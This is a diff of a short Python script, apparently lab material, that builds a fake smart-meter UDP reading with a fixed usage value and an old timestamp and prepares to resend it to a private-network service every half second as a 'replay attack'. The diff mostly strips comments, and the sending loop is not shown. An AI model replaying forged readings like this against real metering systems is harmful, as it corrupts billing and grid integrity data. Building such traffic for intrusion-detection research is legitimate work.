@@ -1,5 +1,4 @@
-# replay_attack.py
-# Pure Replay Attack (Integrity attack, NOT flooding)
+
 
 import socket
 import json
@@ -9,18 +8,17 @@ import sys
 SP_IP = "10.0.3.1"
 SP_PORT = 9999
 
-SEND_INTERVAL = 0.5   # slow rate (important!)
+SEND_INTERVAL = 0.5  
 
 def run_replay(sm_id):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-    # ---- CAPTURED LEGITIMATE PACKET ----
     replay_packet = {
         "smId": sm_id,
-        "usage": 2.75,          # fixed value (key!)
+        "usage": 2.75,         
         "proto": "udp",
         "service": "-",
-        "timestamp": 1720000000 # old timestamp (optional)
+        "timestamp": 1720000000 
     }
 
     print("[*] REPLAY ATTACK STARTED")
